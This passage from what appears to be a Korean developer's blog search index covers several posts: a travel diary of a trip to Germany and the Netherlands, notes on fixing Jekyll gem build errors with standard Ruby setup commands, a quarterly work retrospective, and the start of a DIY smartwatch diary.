맛있었다.그냥 아주 평범한 고기 기내식기내식 단골 소, 치킨 고기였는데 자세히 기억이 안 난다.2번째 기내식도 맛났다.기내식이 총 2번 제공되었는데 한번은 출발할 때 현지 식사 시간, 다른 한번은 도착지 현지 식사 시간에 제공된다. 만약에 오후 5시에 출국이면 6-7시쯤 저녁 기내식이 제공되고 도착하는 현지 시간이 아침 8시면 아침 기내식이 제공되며 이렇게 총 2번이 제공되었다.원래는 6시 30분 도착이었는데 살짝 지연되어서 오후 7시에 도착했다.이어폰도 줬다.중간에 너무 조용해진 시간이 있어서 가방에 컴퓨터를 꺼내서 코드 좀 봤다. 비행기에 와이파이가 안된다고 생각했지만 가끔 와이파이가 잡혔지만 거의 문자열 스트링 받는 수준이었다..평소 시간이 부족해서 보지 못했던 코드들을 좀 살펴보았다.진짜 시간이 많이 남아서 평소에 시간이 많이 필요하거나 어려웠던 코드들을 좀 더 볼 수 있었다.잠든 시간쯤 기내 복도, 내가 앉은 좌석은 복도쪽이다.내가 타고 온 항공사다. 원래 가려던 목적지까지 한번에 가는 직항이 없어서 프랑크 공항까지 와서 기차타고 간다.도착하고 공항을 봤을 때..수하물 찾으러 한참을 걸어나갔다.이때는 몰랐는데 진짜 한참을 걸어나갔다.도착하고 일행으로부터 연락이 쌓여있었고 기차 시간에 좀 빠듯해질거 같이 비행기 수하물이 지연되었다. 다행히 시간은 넉넉하게 도착했다.그런데 기다리는데 짐이 안 올라와서 다급했다… 내가 타고 온 비행기는 baggage claim 이 계속 지연되었다. 친구가 정 안되면 다른 일행을 먼저 보내고 기차를 다른 걸 예매하고 같이 간다고 하였다.이때 유심도 잘 안 되어서 연락이 잘 안 닿았는데 친구가 말하길 공항에서는 데이터가 잘 안 터져 와이파이를 사용하는게 정신건강에 좋다고 했다. 온라인 체크인한 티켓 QR 코드는 계속 띄워놓으라고 하였다.일행과 합류하여 기차를 타러갔다. 공항에서 기차역까지는 계단을 좀 오르고 에스컬레이터를 좀 타면 도착할 수 있었다.기차를 50분 정도 기다린 거 같다. 늦을거 같았지만 수하물이 올라올 때 제일 처음에 올라와 빨리 찾을 수 있었다. 늦을 거 같아서 후다닥 뛰어갔지만 기차 시간까지 50분 정도 기다리며 이야기를 나눴다.상상도 못했다. 영어가 거의 안 보인다. 일반 마트나 슈퍼마켓, 약국에서도 영어를 거의 안 쓴다.손을 씻으려고 들어갔는데 화장실이 비행기 화장실처럼 특이했다. 물이 조금 내려오면서 진공 상태처럼 내려간다.가면서 한국 나이는 어떻게 계산하냐고 물어봤다.ㅋㅋㅋㅋㅋㅋㅋㅋㅋㅋ밥을 안 먹어서 기차 안에 있는 음식점에서 간단한 브리또 같은 걸 사먹었다.첫 독일 식사..ㄹㅇ 언제 도착하는건지 3시간을 달려갔다.중간에 환승하느라 내려서 다른 기차로 갈아탔는데 이때 첫 옥토버페스트가 진행된 도시가 있었는지 옷에 스티커가 붙은 사람들이 많이 탔다.결국 도착했다. 피곤에 쩔었다.이때 일행들 부모님들이 마중 나와주셨고 뭔가 타지에서 와서 그런지 알쏭달쏭하셨을거 같다.긴 비행으로 제정신 아닌 상태이떼 새벽 3시까지 담화를 나눈 것으로 기억한다.왼쪽부터 Simon, Tobi, Vla, Ruffalo먼 길을 와서 피곤한 첫날밤 근데 아주 재밌는건 친구들도 나와 같은 시간을 넘어왔다 2주동안 일본 여행하고 그들이 귀국할 때 내가 때마침 입국을 한 것이다. 서로 같은 시차로 괴로워했다.한국에서 가져온 과자와 컵라면인데 많을줄 알았는데 금방 품절되었다..이렇게 인기가 많을줄은..가까운 곳에 있는 마트를 갔는데 슈퍼마켓이라고 하기에는 작고 대형마트라고 하기에는 그 수준은 아니었다.술이 굉장히 많았고 스파클링이 첨가된 물이 있어 신기했다. 우리나라로 치면 탄산수다.뭘 많이 샀는데 진짜 너무 많이 산 거 같았다.너무 반가운 신라면 감기 걸리고 배고플 때 라면을 끓여먹었다.크리스마스 비스켓이라고 하는데 우리가 아는 흔한 커피 쿠키 맛이 연상된다.웅장.. 이 맛에 사는게 아닐까 싶다.이번 여행을 요약한다면 이 사진 한 장 아닐까일요일에 고기 음식을 만들어 먹을 예정으로 꽤 많은 장을 봤다.엄청나게 샀다.산 물품은 많고 장바구니가 없어서 난감했지만 다행히 우리가 머무는 곳이 근처라 한 사람이 짐을 지키고 나머지 사람이 짐을 옮겼다.여기는 빵 요리가 특색이라 빵 사이에 샐러드나 햄이나 치즈 버터 등등 각양각색의 재료를 넣어 입맛대로 먹는다.내가 부실한 것처럼 보이지만 그게 맞다.첫 날은 근처 캠퍼스를 구경하러 갔다. 근처에 대학교가 있었는데 당시에는 토요일이라 쉬는 날이어서 아무도 없어 자유롭게 캠퍼스를 둘러볼 수 있었다.도로가 펼쳐졌는데 멀리 있어 끝도 보이지 않았다.녹색이 너무 좋았다.개인적으로 자연을 좋아해서 가까운 곳에 있는 산책로 공원을 갔는데 사람 사는 기분이 느껴졌다. 평지는 넓게 펼쳐져서 바람도 불고 녹색 빛을 마음껏 느낄 수 있었다. 맨날 모니터 앞에 있으니.. 이런 풍경이 반갑지 않을리 없다.진심으로 여기를 봐줘서 고마워…ㅠㅠ중간에 만난 귀여운 강아지 친구, 사진 찍기 위해 한번 봐주었는데 머리만큼 큰 DSLR 렌즈를 보이니까 좀 두려웠나보다.맨날 모니터만 보다가 이런 자연을 보면 눈이 너무 편안해진다.바람이 많이 불어서 생각보다 시원했다.나홀로 나무 같은 느낌이라기에는 나홀로 있지 않잖아 이 곳에서 동양인 어머니와 2명의 아이들을 만났는데 너무 귀여웠다.산책길을 내려오다가 찍은 집부자들이 산다는 집이라고 한다.고양이가 있어서 아는 척 하고 싶었는데 실패했다.산책로나 근처 캠퍼스를 가려면 이곳을 지나는데 매번 본 건물이다.위 사진은 숙소뷰이다. 전날 도착했을 때 밤이어서 아무것도 보이지 않았는데 아침이 되니까 정말 건물들과 차량들이 지나는 것을 선명하게 볼 수 있었다.버스전광판을 찍어봤다.대학교 캠퍼스를 구경했다.이 날이 토요일이라 그런지 사람이 없었다.가든을 갔는데 이때 발을 들이면 안 되는데.. 왜냐면요.. 들어가자마자 카메라가 뿌옇게 습하게 변해져서 기겁을 했다.. 잘못하면 이슬이 맺히면 그대로 아사 각이었으니..가든인데 들어오자마자 카메라에 습기가.. 정말 한 순간이었지만 비명을 질렀다.저녁시간에 저녁을 만들어 먹는 걸 찍어봤다.내가 머무는 곳 계단이다. 영화에서나 보던 그런 계단이다. 소리도 삐걱삐걱 소리난다.근처에 있는 마트인데 이마트와 중소형 슈퍼마켓 사이 어딘가에 있는 마켓이다.혼자 자유롭게 다녀보았다. 이 날은 스타벅스를 찾아갔는데 ㄹㅇ 40분은 걸은 거 같다.여긴 자전거가 정말 발달되어있다. 휴일에는 자전거 &gt; 사람 &gt; 자동차 순으로 보인다.길을 건너려면 해당 버튼을 눌러야한다. 신호등이 바뀌긴하지만 저걸 누르면 좀 더 빨리 바뀐다.동화 속에 들어온 기분이다.여기 주변에서 한국인 분들을 만날 수 있었다.이때 알게된 충격 사실 …카메라에 먼지가 들어갔다…축제를 하는지 어린 꼬마들이 나와서 행사에 참여하고 있었다.독일 버스인데 2개의 버스를 이어놓은 모습이다.버스 2개가 하나로 다니는 거 처럼 보인다. 운전을 엄청 잘하신다. 커브 길에서 길을 틀 때 장관이다.이런 건물은 대부분 쉐어하우스 느낌이라고 한다.이때는 Simon 부모님 집에 가서 차를 타고 네덜란드로 갈 예정이었으나 몸 상태가 완전 박살나서 그 다음날로 미뤘다.이때 열이나서 마음대로 못 다녔다. 너무 힘들었는데 집주인 본가 놀러간 날이다.이때 식탁에서 많은 얘기를 나눴는데 이 사람과 나는 진짜 많이 닮았다고 생각이 들었고 개발자하길 잘했다고 생각이 들었다.책을 진짜 좋아한다고 한다.고양이가 수줍음을 많이 타서 눈만 마주쳤다.친구집 주방저 지붕 사이드에 머리를 몇십번은 부딪혓다.네덜란드로 넘어갔다.풍력발전기가 보일때마다 신기했다.네덜란드 입성 !!!!앞에 보이는 문구와 별개로 뒤에 적혀있는 문구가 진짜 감동이었는데 사진을 못 찍었다.드러누운 상태로 찍었다. 진짜 공기가 맑았다.중간에 비가 와서 카페에 들어왔다. 살짝 허기져서 음식을 주문했는데 이렇게 큰 미트볼 처음 먹어본다. 진짜 배불렀다.자전거 보관소가 신기했다. 위에 자전거 받침대를 내리면 비스듬히 자전거 받침대가 내려온다. 거기에 자전거를 올려서 위로 밀어올리면 된다.보이는지 모르곘지만 비가 엄청온다. 이래도 사람들은 우산을 안 쓰더라..당장 차로 피신하였다.이후에는 자유롭게 사진도 찍고 돌아다녔다.아랫집에서 강아지를 키웠다.열도 내리고 몸이 좀 괜찮아지려고 했었다.종종 미팅하다보면 사이렌 소리가 들렸는데 실제로 들어보니 귀가 찢어지는줄 알았다.아침에 일어나서 시리얼을 먹었는데 진짜 찐 10000% 땅콩 시리얼이었다.신라면을 몇개 가져갔는데 정말 인기가 많아서 더 가져오지 못한 게 아쉬웠다.Simon이 쓰는 랩탑인데 정말 잘 쓰고 정말 튼튼하다면서 몸소 앞에서 랩탑을 때리고 던지는 모습을 보여줬다. (던졌을때 벽에 부딪혀 배터리 단자가 부숴졌다…)스타벅스까지 걸어오는데 동양인이나 한국 사람으로 보이는 사람들이 많았다.코드 좀 봤다.왜 카페에서 공부하는지 이때 좀 알 거 같았다.일요일 저녁을 만들어 먹을 때인데 이때는 알지 못했다. 역대급으로 소고기를 질리도록 먹은 날이다.이렇게 긴 걸이렇게 돌돌말아서이렇게 만든다.참고로 2개가 1인분이다.Simon 방인데 스피커로 말하면 커튼이 내려온다.조금 가져온 한국과자.약과를 어떻게 설명해야할지 몰랐다. 굉장히 흥미있게 먹어줬다.완성된 저녁식사, 고기를 오븐에 넣고 기다려야해서 1시간 30분 정도 기다린 후 밤 10시에 식사를 했다.감기가 너무 걸려서 약국에 가서 타이레놀이랑 스트렙실을 받았다.타이레놀은 위와 같은 것을 받았다.왼쪽 손잡이를 위로 세우면 카트로 변신하는 장바구니이다.왼쪽 보이는 콜라는 AI 가 만들었다는데 진짜 맛도 색깔도 신기했다.생크림 같은건데 엄청 달고 중독성이 있었다.동네 냥이 놀아주는 경력 4년차여기는 신기하게 담배를 주문한다. 앞에 버튼을 누르면 담배가 떨어지는 자동판매기였다. 어떻게 알았냐면 앞사람이 그렇게 주문하더라구요.위쪽은 Paul, 이 프로젝트의 owner 이자 여기로 이끈 사람이다.공원에 나와서 코드 좀 봤다.사용하지 않는 물품을 무료로 나눔하는 모습이다.밖에서 이탈리아 음식을 먹으러 나왔는데 점원에게 음식을 주문할 때 손을 들거나 말하면 안되는게 에티켓이라 점원이 이쪽을 보거나 눈이 마주칠 때까지 기다려야 한다고 한다.이 용도로 산 노트북을 이렇게 처음 써본다.아는 분 기념품으로 드릴려구 헀는데 저 봉이 상식적으로 가방에 들어갈 일이 없어서 걍 사진으로 마음만 전했다.삽을 기념품으로 샀는데 궁금한 사람 있나요? .. 썰 듣고 싶다면 오세요…doner 라는건데 케밥 느낌이다. 양도 많고 저렴해서 맛있었다.가져갈 선물들을 왕창 샀다.정리하며연차와 연휴의 아주 괜찮은 조합으로 꽤 길게 여행을 갔다왔는데 감기 걸린거 빼곤 나쁘지 않았다. 추후 또 여행을 계획하겠지만 아직은 예정이 없을 거 같다." }, { "title": "블로그 빌드해서 확인하는 방법", "url": "/posts/build-jekyll-blog/", "categories": "blog", "tags": "blog", "date": "2023-09-24 00:00:00 +0900", "snippet": "빌드해서 로컬에서 확인하기새로운 환경에서 글을 쓸 때 설치되지 않은 패키지들이 많아 레퍼런스를 찾으면서 설치하긴 했는데 여기다가 정리해놓으려고 한다.필요한 부분이 없으면 아래와 같이 길고 긴 메세지를 마주친다.Gem::Ext::BuildError: ERROR: Failed to build gem native extension. current di...", "content": "빌드해서 로컬에서 확인하기새로운 환경에서 글을 쓸 때 설치되지 않은 패키지들이 많아 레퍼런스를 찾으면서 설치하긴 했는데 여기다가 정리해놓으려고 한다.필요한 부분이 없으면 아래와 같이 길고 긴 메세지를 마주친다.Gem::Ext::BuildError: ERROR: Failed to build gem native extension. current directory: /var/lib/gems/3.0.0/gems/eventmachine-1.2.7/ext/usr/bin/ruby3.0 -I /usr/lib/ruby/vendor_ruby -r ./siteconf20230924-95037-izc68n.rb extconf.rbmkmf.rb can't find header files for ruby at /usr/lib/ruby/include/ruby.hYou might have to install separate package for the ruby developmentenvironment, ruby-dev or ruby-devel for example.extconf failed, exit code 1Gem files will remain installed in /var/lib/gems/3.0.0/gems/eventmachine-1.2.7 for inspection.Results logged to /var/lib/gems/3.0.0/extensions/x86_64-linux/3.0.0/eventmachine-1.2.7/gem_make.out /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:95:in `run' /usr/lib/ruby/vendor_ruby/rubygems/ext/ext_conf_builder.rb:47:in `block in build' /usr/lib/ruby/3.0.0/tempfile.rb:317:in `open' /usr/lib/ruby/vendor_ruby/rubygems/ext/ext_conf_builder.rb:26:in `build' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:161:in `build_extension' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:195:in `block in build_extensions' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:192:in `each' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:192:in `build_extensions' /usr/lib/ruby/vendor_ruby/rubygems/installer.rb:847:in `build_extensions' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/rubygems_gem_installer.rb:71:in `build_extensions' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/rubygems_gem_installer.rb:28:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/source/rubygems.rb:204:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/gem_installer.rb:54:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/gem_installer.rb:16:in `install_from_spec' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/parallel_installer.rb:186:in `do_install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/parallel_installer.rb:177:in `block in worker_pool' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:62:in `apply_func' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:57:in `block in process_queue' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:54:in `loop' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:54:in `process_queue' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:91:in `block (2 levels) in create_threads'An error occurred while installing eventmachine (1.2.7), and Bundler cannot continue.In Gemfile: jekyll-theme-chirpy was resolved to 6.1.0, which depends on jekyll-archives was resolved to 2.2.1, which depends on jekyll was resolved to 4.3.2, which depends on em-websocket was resolved to 0.5.3, which depends on eventmachineGem::Ext::BuildError: ERROR: Failed to build gem native extension. current directory: /var/lib/gems/3.0.0/gems/http_parser.rb-0.8.0/ext/ruby_http_parser/usr/bin/ruby3.0 -I /usr/lib/ruby/vendor_ruby -r ./siteconf20230924-95037-o732o6.rb extconf.rbmkmf.rb can't find header files for ruby at /usr/lib/ruby/include/ruby.hYou might have to install separate package for the ruby developmentenvironment, ruby-dev or ruby-devel for example.extconf failed, exit code 1Gem files will remain installed in /var/lib/gems/3.0.0/gems/http_parser.rb-0.8.0 for inspection.Results logged to /var/lib/gems/3.0.0/extensions/x86_64-linux/3.0.0/http_parser.rb-0.8.0/gem_make.out /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:95:in `run' /usr/lib/ruby/vendor_ruby/rubygems/ext/ext_conf_builder.rb:47:in `block in build' /usr/lib/ruby/3.0.0/tempfile.rb:317:in `open' /usr/lib/ruby/vendor_ruby/rubygems/ext/ext_conf_builder.rb:26:in `build' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:161:in `build_extension' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:195:in `block in build_extensions' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:192:in `each' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:192:in `build_extensions' /usr/lib/ruby/vendor_ruby/rubygems/installer.rb:847:in `build_extensions' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/rubygems_gem_installer.rb:71:in `build_extensions' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/rubygems_gem_installer.rb:28:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/source/rubygems.rb:204:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/gem_installer.rb:54:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/gem_installer.rb:16:in `install_from_spec' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/parallel_installer.rb:186:in `do_install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/parallel_installer.rb:177:in `block in worker_pool' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:62:in `apply_func' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:57:in `block in process_queue' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:54:in `loop' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:54:in `process_queue' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:91:in `block (2 levels) in create_threads'An error occurred while installing http_parser.rb (0.8.0), and Bundler cannot continue.In Gemfile: jekyll-theme-chirpy was resolved to 6.1.0, which depends on jekyll-archives was resolved to 2.2.1, which depends on jekyll was resolved to 4.3.2, which depends on em-websocket was resolved to 0.5.3, which depends on http_parser.rbGem::Ext::BuildError: ERROR: Failed to build gem native extension. current directory: /var/lib/gems/3.0.0/gems/racc-1.7.1/ext/racc/cparse/usr/bin/ruby3.0 -I /usr/lib/ruby/vendor_ruby -r ./siteconf20230924-95037-axw6un.rb extconf.rbmkmf.rb can't find header files for ruby at /usr/lib/ruby/include/ruby.hYou might have to install separate package for the ruby developmentenvironment, ruby-dev or ruby-devel for example.extconf failed, exit code 1Gem files will remain installed in /var/lib/gems/3.0.0/gems/racc-1.7.1 for inspection.Results logged to /var/lib/gems/3.0.0/extensions/x86_64-linux/3.0.0/racc-1.7.1/gem_make.out /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:95:in `run' /usr/lib/ruby/vendor_ruby/rubygems/ext/ext_conf_builder.rb:47:in `block in build' /usr/lib/ruby/3.0.0/tempfile.rb:317:in `open' /usr/lib/ruby/vendor_ruby/rubygems/ext/ext_conf_builder.rb:26:in `build' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:161:in `build_extension' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:195:in `block in build_extensions' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:192:in `each' /usr/lib/ruby/vendor_ruby/rubygems/ext/builder.rb:192:in `build_extensions' /usr/lib/ruby/vendor_ruby/rubygems/installer.rb:847:in `build_extensions' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/rubygems_gem_installer.rb:71:in `build_extensions' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/rubygems_gem_installer.rb:28:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/source/rubygems.rb:204:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/gem_installer.rb:54:in `install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/gem_installer.rb:16:in `install_from_spec' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/parallel_installer.rb:186:in `do_install' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/installer/parallel_installer.rb:177:in `block in worker_pool' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:62:in `apply_func' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:57:in `block in process_queue' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:54:in `loop' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:54:in `process_queue' /usr/share/rubygems-integration/all/gems/bundler-2.3.5/lib/bundler/worker.rb:91:in `block (2 levels) in create_threads'An error occurred while installing racc (1.7.1), and Bundler cannot continue.In Gemfile: html-proofer was resolved to 3.19.4, which depends on nokogiri was resolved to 1.15.4, which depends on racc필요한 패키지 설치하기참고한 링크는 다음과 같다.$ sudo apt-get install ruby-full build-essential zlib1g-dev# set user directory not root$ echo '# Install Ruby Gems to ~/gems' &gt;&gt; ~/.bashrc$ echo 'export GEM_HOME=\"$HOME/gems\"' &gt;&gt; ~/.bashrc$ echo 'export PATH=\"$HOME/gems/bin:$PATH\"' &gt;&gt; ~/.bashrc$ source ~/.bashrc$ gem install jekyll bundler$ bundle$ bundle exec jekyll s" }, { "title": "달리는 자동차를 정비하는 방법", "url": "/posts/quarter-3-dynamic-engine/", "categories": "develop-diary, research-diary", "tags": "android, mobile, linux, research, system", "date": "2023-09-20 00:00:00 +0900", "snippet": "들어가며올해 초는 정말 어떻게 살았는지 아직도 모를 때가 많다. 바쁘기도 바쁘지만 앞이 안 보일 정도로 너무 어두웠다. 수년간 찾지 못했던 답을 찾아야 하는 과제라 굉장히 난이도도 높았다. 지금에서야 보면 별거 아니지만 모든 일이 그렇지 않을까 싶다. 방법을 찾고나면 허무하지만 인사이트를 얻게되는 것, 그게 이 길의 특징 아닐까 싶다. 생각해보면 대단...", "content": "들어가며올해 초는 정말 어떻게 살았는지 아직도 모를 때가 많다. 바쁘기도 바쁘지만 앞이 안 보일 정도로 너무 어두웠다. 수년간 찾지 못했던 답을 찾아야 하는 과제라 굉장히 난이도도 높았다. 지금에서야 보면 별거 아니지만 모든 일이 그렇지 않을까 싶다. 방법을 찾고나면 허무하지만 인사이트를 얻게되는 것, 그게 이 길의 특징 아닐까 싶다. 생각해보면 대단한 기술을 만드는 게 아니라 우리가 가지고 있는 고정관념을 벗어나 놓치고 있는 방법을 발견하는 것이 아닐까 싶다. 이번 3분기 회고도 이와 마찬가지라고 생각한다.어디든 가면 배우는 게 많은 요즘인데 지난 1년 이 직업을 가지면서 무턱대고 만드는 게 전부가 아니란 걸 많이 깨달았다. 여기 다른 동료분들은 프로젝트에 어느 틈도 놓치지 않으려고 secure 하게 코드를 작성하려고 한다. 어떤 작업을 시작할 때 architecture 를 크게 보고 작업에 필요한 재료를 몇가지 리스트를 뽑아 엄선해서 각각의 특성을 이용했을 때 후에 있을 damage 까지 고려하여 코드 작성이 시작된다.단순하게 작동되어 상용화될 수 있는 무언가를 만드는 것에 멈추지 않고 그것이 오로지 우리가 의도한 방향으로, 목적으로 흘러갈 수 있게 오작동이나 보안에 대한 영역도 버리지 않는 셈이다.달리는 자동차를 정비하기자동차는 정비소에 정차해서 고장난 부분이나 새로 바꿀 부분을 확인할 수 있다.만약 이를 주행중에 하려고 하면 어떻게 돨까?목숨 걸고 주행하거나, 부품 하나 잃어버리면 도로 위에 언제 터질지 모르는 시한폭탄이 돌아다니는 셈이다. 우리는 앞으로 정비소에 자동차를 잠시 정차하지 않고도 주행중에 자동차를 정비하는 방법을 모색해야했다. 하지만 그간 진행해온 structure 로는 이를 실현할 수 없었다. 정비소에는 정차했을 때 정비할 수 있는 도구만 준비되어있지 이러한 도구를 가지고 주행중인 차를 제대로 정비하기란 쉽지 않을 것이다. 또 안전 보호대나 장치들이 없기 때문에 당장 주행중에 수리를 한다면 큰일이 벌어질 수 있는 것이다.이를 위하여 우리는 기존과는 다른 architecture 와 기술들이 필요했고 주행중에 사고가 날 수 있는 모든 경우의 수를 미리 예측하거나 예방하기 위해 2차, 3차, 4차 안전 보호대를 준비하였다.이러한 정비를 위해서는 기존에 가지고 있던 툴로는 어림도 없다. 기존의 방법으로는 달리는 차를 정비하기는 커녕 부품 찾기도 어렵기 때문이다. 기존의 틀을 다 걷어내고 처음부터 structure 를 다시 설계했다. 차량 바퀴는 주행중 정비하면 덜컹 거릴 수 있으니 최대한 부드럽게, 볼트나 너트는 잃어버릴 수 있으니 다른 걸로 대체하고, 주행중에 사고가 날 수 있으니 안전모나 안전장비 등도 갖춰야했다.추가로 살펴봐야 하는 부분이 몇가지 더 있다. 부품도 주행중일때 교체를 한다면 안전성을 증빙을 해야한다. 그러기에 부품에 대한 신뢰도를 체크하기 위한 툴도 준비되어야 한다. 또한 정비소에선 부품이 여분으로 가져올 수 있지만 주행중엔 여분의 부품을 미리 준비하던가 어떤 부품이 얼마나 필요할지 사전 조사가 필요하다. 이러한 많은 것을 염두하면서 기존과 목적은 동일하게 자동차는 계속 달리는 퍼포먼스를 내야하기에 우리는 완전 다른 방향으로, 다른 structure 로, 다른 architecture 로 디자인했다.어쨌든 돌아가기는 하니까뭐 어떻게든 만들다보면 작동은 합니다.작동은 언제나 하더라구요 .생각한 모습대로 흘러가지 않는 이상한 모습이 펼쳐질 때가 종종 있어서 그렇지 .. 최적화와 함께 개발하면 좋다고 생각하지만 일단 작동되는게 먼저라고 생각하기에 목이 부러지더라도 일단 날아야지 그 이후에 목을 수술하던 목 근육을 강화하던 할 거 같다.사실 작동은 되는데 생각대로 되지 않는다면 그 다음은 코드 한 줄 한 줄 디버깅의 시간이 기다리고 있다고 생각하면 된다.버그 해결하는 방법: 자고 일어나거나 자려고 눕기왜 그런거 있잖아요잠잘때 폰 보면 안 보이는 벌레들이 휴대폰 조명에 모여들듯.. 잠 잘려고 하면 보이지 않던 버그 해결 방법이 막 떠오른다고책상에 6시간 동안 모니터와 씨름할 때는 도저히 알 수 없던 문제들에 대해 이상하게 내일하자 자려고 눕기만 하면 머릿속에 여러 테스트 도안들이 나와 다시 일어나서 모니터를 켜고 코드를 보게 한다. (물론 결과는 생각하는 것과 같다.)이렇듯이 한번 생기면 잡기 어려운게 버그다. 정비소에서 정비하는 차량은 정비소 위치나 번호 그리고 정비했던 부품 등이 기록으로 남아 쉽게 확인이 가능하지만 주행중인 차를 정비한 기록은 추적하기가 어렵다.혹시나 나중에 주행중 문제가 생긴다면 문제를 확인해야 하는데 정비소와 다르게 어떤 위치에서 어떤 부품을 왜 교체했는지 알 방법이 없다. 이러한 부분을 위해서 교채 히스토리 관리를 위한 툴도 만들었다.정리하며3분기는 연구도 개발도 적당히 반반 했던 시간이다.시간이 날 때마다 기록하고 연구도 하고 개발도 하는데 다양한 코드도 많이 볼수록 배워가는 거 같고 신기한 패턴이나 유명한 회사에서 지향하는 기술이나 코드들은 조금씩 따라가보면서 학습해보려고 한다." }, { "title": "손목시계 개발 일기", "url": "/posts/SmartWatch/", "categories": "develop, osw, diary", "tags": "osw, develop", "date": "2023-09-17 00:00:00 +0900", "snippet": "손목시계 개발기처음 시작하기도 했고 꽤 의미가 큰 프로젝트이다. 코딩을 시작하면서 개발하고 완성하고 끝이 아니라 사용하면서 피드백을 주어 개선점을 찾아가 고민하고 있는 손목시계 개발기에 대해 끄적하려고 한다.어쩌면 지금 생각해보면 오랜 시간 만든 프로젝트를 사용해보면서 개선점을 찾아 주기적으로 유지보수했던 첫 프로젝트가 아닐까 싶다. 그래서 더 의미있...", "content": "손목시계 개발기처음 시작하기도 했고 꽤 의미가 큰 프로젝트이다. 코딩을 시작하면서 개발하고 완성하고 끝이 아니라 사용하면서 피드백을 주어 개선점을 찾아가 고민하고 있는 손목시계 개발기에 대해 끄적하려고 한다.어쩌면 지금 생각해보면 오랜 시간 만든 프로젝트를 사용해보면서 개선점을 찾아 주기적으로 유지보수했던 첫 프로젝트가 아닐까 싶다. 그래서 더 의미있고 더 뜻깊은 프로젝트였다.시작은 어릴 때 봤던 만화영화 주인공이 차고 있던 손목시계에서 시작했다. 항상 붙어있고 가볍게 만질 수 있는 물건을 DIY (Do It Yourself)하는 정신이 있어 그 나이 때에 손목시계를 사서 분해하기도 헀고 손목시계에 손에 보이는 요상한 것을 테이프로 붙이기도 했다. 예를 들어 MP3라던가..그 이후로 20살이 지나 아두이노라는 기판을 알게되면서 유년 시절 품었던 상상의 날개짓이 시작되었다.학부생 때 대회에 나가면서 간단한 하드웨어를 직접 만들게 되었다. 이 당시는 개발을 쉽게 할 수 있도록 만들어진 기성 보드가 많아 임베디드를 어렵지 않게 배우고 흥미를 가질 수 있었다.하드웨어를 만들 수 있고 거기에 프로그래밍을 얹어서 생각한 대로 무엇인가 동작하는 것을 본 것은 너무 큰 즐거움을 주었다.후에 뭔가를 더 만들어보고 싶기도 하고 예전부터 만들어보고 싶었던 시계를 만들어보고자 시작해보았다.오픈소스 손목시계우연한 기회로 하드웨어 DIY 손목시계 키트를 볼 수 있었고 해당 하드웨어를 만들고 소프트웨어 코드가 오픈소스로 이뤄져있다는 걸 알았다.추가하고 싶은 하드웨어 기능들과 더 만들고 싶은 기능들을 구성해보았다.전원 방식 교체관심 있는 분야에서 접근하기 쉬운 부분으로 맨 처음 시도한 것은 하드웨어에서 전원 방식을 교체하는 것이다. 프로그래밍을 자주 하고 테스트하는 환경이니까 동전 건전지가 비교적 빨리 소모되었다. Micro 5 pin을 사용하는 충전 모듈로 충전식으로 전원 방식을 바꿨다.충전이 가능한 3.7V 소형 리튬배터리맞는 크기에 배터리를 구하여 동전 전지 소켓을 제거하고서 배터리를 연결하였다. 전압은 3.7V 250mah를 사용하였다.동전 건전지 대신 